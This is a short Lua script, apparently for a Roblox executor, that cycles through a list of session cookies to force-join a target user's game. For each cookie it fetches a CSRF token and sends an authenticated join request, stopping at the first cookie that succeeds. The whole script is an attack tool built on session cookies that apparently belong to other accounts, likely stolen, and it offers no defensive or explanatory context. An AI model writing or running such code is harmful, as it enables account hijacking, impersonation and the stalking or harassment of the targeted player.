local function attemptJoin(cookie, index)
    print("Attempting with cookie #" .. index)
    
    -- Step 1: Fetch CSRF token
    local csrfRequest = request({
        Url = "https://www.roblox.com/game/join",
        Method = "GET",
        Headers = {
            ["Cookie"] = cookie
        }
    })
    
    local csrfToken = nil
    if csrfRequest.Headers and csrfRequest.Headers["x-csrf-token"] then
        csrfToken = csrfRequest.Headers["x-csrf-token"]
    else
        print("Cookie #" .. index .. " - Failed to fetch CSRF token")
        return false
    end
    
    -- Step 2: Send join request
    local joinRequest = request({
        Url = "https://www.roblox.com/game/join?userId=" .. realUserId,
        Method = "POST",
        Headers = {
            ["Cookie"] = cookie,
            ["X-CSRF-TOKEN"] = csrfToken,
            ["Content-Type"] = "application/x-www-form-urlencoded"
        },
        Body = "userId=" .. realUserId
    })
    
    if joinRequest.StatusCode == 302 then
        print("SUCCESS! Cookie #" .. index .. " worked!")
        print("Redirect:", joinRequest.Headers["location"])
        return true
    elseif joinRequest.StatusCode == 403 then
        print("Cookie #" .. index .. " - Failed (403 - Invalid or joins disabled)")
        return false
    else
        print("Cookie #" .. index .. " - Failed (Status: " .. joinRequest.StatusCode .. ")")
        return false
    end
end

-- Try each cookie until one works
local success = false
for i, cookie in ipairs(realCookies) do
    if attemptJoin(cookie, i) then
        success = true
        break
    end
end

if not success then
    print("All cookies failed to join user:", realUserId)
end
